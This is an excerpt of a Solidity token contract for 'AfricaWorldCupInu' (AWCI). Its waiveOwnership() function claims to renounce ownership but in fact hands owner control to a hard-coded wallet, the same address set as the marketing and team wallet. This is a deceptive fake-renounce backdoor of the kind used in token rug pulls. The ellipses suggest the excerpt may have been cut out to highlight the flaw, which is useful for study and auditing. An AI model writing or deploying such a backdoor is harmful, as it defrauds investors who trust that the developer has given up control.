...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb4f68dD7f1Fd6C6143EED0Dc816dc393a950C2D8);
    }
...
contract AFRICAWORLDCUPINU is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AfricaWorldCupInu";
    string private _symbol = "AWCI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb4f68dD7f1Fd6C6143EED0Dc816dc393a950C2D8);
    address payable public teamWalletAddress = payable(0xb4f68dD7f1Fd6C6143EED0Dc816dc393a950C2D8);
